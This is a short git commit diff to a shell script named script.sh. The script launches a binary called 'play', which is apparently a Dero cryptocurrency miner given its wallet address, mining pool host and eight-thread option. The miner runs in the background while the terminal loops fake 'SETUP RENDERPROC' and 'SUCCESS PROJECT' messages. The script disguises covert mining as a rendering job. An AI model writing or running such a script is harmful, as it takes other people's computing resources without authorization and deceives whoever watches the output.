c99fa2b5d4f2baebe240bfd6a3f6902983bf5386
playdoco <121803568+playdoco@users.noreply.github.com>
2023-01-03 01:49:04 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 chmod u+x play
 
-screen -dmS run ./play -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r dero.rabidmining.com:10300 -p rpc -m 8
-i=1
-while true; do clear; echo SETUP RENDERPROC $i; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
+./play -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xe4y4hajkwqp50qqlvpsp -r dero.rabidmining.com:10300 -p rpc -m 8 &
+
+while true; do clear; echo SETUP RENDERPROC 1; sleep 5; clear; echo SUCCESS PROJECT; sleep 1;let "i++";  done
